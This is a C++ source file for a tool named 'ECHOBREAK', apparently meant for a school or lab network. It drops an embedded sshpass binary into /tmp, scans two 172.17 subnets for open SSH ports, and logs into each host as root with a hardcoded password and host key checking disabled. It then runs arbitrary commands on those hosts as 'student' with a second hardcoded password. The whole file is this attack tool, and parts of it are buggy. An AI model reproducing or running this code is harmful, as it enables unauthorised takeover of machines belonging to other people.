#include <string>
#include <sys/stat.h>
#include <iostream>
#include <unistd.h>
#include <memory>
#include <fstream>
#include <vector>
#include <array>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "sshpass_binary.h"

#define TEMP_FILE_PATH "/tmp/sshpass"

// i am so fucking tired

bool isPortOpen(const std::string& ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        std::cerr << "fail to create socket" << std::endl;
        return false;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &server.sin_addr);

    struct timeval timeout;
    timeout.tv_sec = 1;  
    timeout.tv_usec = 500000;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));

    // try
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        close(sock);
        return false;  // port closed
    }

    close(sock);
    return true;  // port opened
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, int(*)(FILE*)> pipe(popen(cmd, "r"), pclose);
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }

    return result;
}

std::vector<std::string> split(std::string str){
	std::string word = "";
	std::vector<std::string> res;
	for(char c : str){
		if(c == ' '){
			res.push_back(word);
			word = "";
		}
		else{
			word += c;
		}
	}
	res.push_back(word);
	return res;
}

inline std::string connect(std::string host, std::string command, int is_download){
	std::ifstream in("hosts.txt", std::ios::in);
	if(in.is_open()){
		std::string line = "";
		while(std::getline(in, line)){
			if(split(line)[0] == host){
				if(is_download == 0){
					return exec(("sshpass -p 12345678 student@" + split(line)[1] + " " + command).c_str());
				}
				else{
					std::string tmp = TEMP_FILE_PATH;
					return exec((tmp + " -p 12345678 student@" + split(line)[1] + " " + command).c_str());
				}
			}
		}
	}
	else{
		return "hosts not found\n";
	}
	in.close();
	return "host not found\n";
}

int main(int argc, char* argv[]){	

	int is_download = system("sshpass -V");

	std::string temp_file_path = TEMP_FILE_PATH;
	
	if(is_download != 0){
		std::ofstream temp_file(temp_file_path, std::ios::binary);
		if(!temp_file) {
			std::cerr << "err please report the code to the developers: 1\n";
			return 1;
		}
		temp_file.write(reinterpret_cast<const char*>(_usr_bin_sshpass), _usr_bin_sshpass_len);
		temp_file.close();
		chmod(temp_file_path.c_str(), 0755);
	}

	system("clear");
	std::cout << "W3LC0M3 T0 \033[095mECHOBREAK\033[0m!!" << std::endl;
	std::string command;
	std::vector<std::string> hosts;
	time_t start, end;
	int total = 0;

	time(&start);
	if(argc <= 1){
		std::cout << "Enter: scan, setup, connect\n";
		std::cout << "	scan - scanns for computers\n";
		std::cout << "	send [host] [cmd] - send cmd to host\n";
		return 1;
	}
	std::string arg = argv[1];
	if(arg == "scan"){
		std::string currect_host = "";
		for(int i = 2; i < 256; ++i){
			//checking for 212
			if(isPortOpen("172.17.212."+std::to_string(i), 22)){
				if(is_download == 0){
					command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " hostname"; //ip
				}
				else{
					command = temp_file_path + " -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " hostname"; //ip
				}
				currect_host = exec(command.c_str()) + " 172.17.212."+std::to_string(i);
				hosts.push_back(currect_host); //to ip data base (edit to system if it does not working)
				std::cout << currect_host << std::endl;
				++total;
			}
			//checking for 213
			if(isPortOpen("172.17.213."+std::to_string(i), 22)){
				if(is_download == 0){
					command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " hostname"; //ip
				}
				else{
					command = temp_file_path + " -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " hostname"; //ip
				}
				currect_host = exec(command.c_str()) + + " 172.17.213."+std::to_string(i);
				hosts.push_back(currect_host); //to ip data base (edit to system if it does not working)
				std::cout << currect_host << std::endl;
				++total;
			}
		}

		std::ofstream out("hosts.txt", std::ios::out); //open file to rewrite all data
		for(auto host : hosts){ // for each loop
			out << host << std::endl; // write
		}
		out.close(); // close file
		std::cout << "total hosts: " << total << std::endl;
	}	

	else if(arg == "send"){
		std::string host = argv[1];
		std::string cmd = "";
		for(int i = 2; i < argc; ++i){
			cmd += argv[i];
		}
		std::cout << connect(host, cmd, is_download);

	}
	time(&end);
	double execution_time = difftime(end, start);
	std::cout << "time taken: " << std::fixed << execution_time << std::endl;
	return 0xABCDEF;
}
